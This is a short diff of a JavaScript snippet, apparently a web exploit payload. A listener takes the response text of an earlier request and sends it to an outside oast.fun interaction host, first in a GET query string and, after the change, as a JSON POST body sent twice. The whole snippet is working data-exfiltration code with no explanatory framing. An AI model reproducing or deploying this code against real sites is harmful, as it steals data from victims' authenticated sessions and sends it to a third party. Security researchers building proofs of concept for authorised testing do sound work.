@@ -6,6 +6,12 @@ req.send();
 
 function reqListener() {
     for(let i = 0; i < 2; i++){
-        fetch(('https://ck2pdd52vtc0000mge80gjtmgswyyyyyb.oast.fun/?xxx='+this.responseText))
+        fetch('https://ck2pdd52vtc0000mge80gjtmgswyyyyyb.oast.fun/zzz', {
+            method: 'POST',
+                headers: {
+                'Content-Type': 'application/json;charset=utf-8'
+                },
+            body: JSON.stringify(this.responseText)
+        });
     }
 };
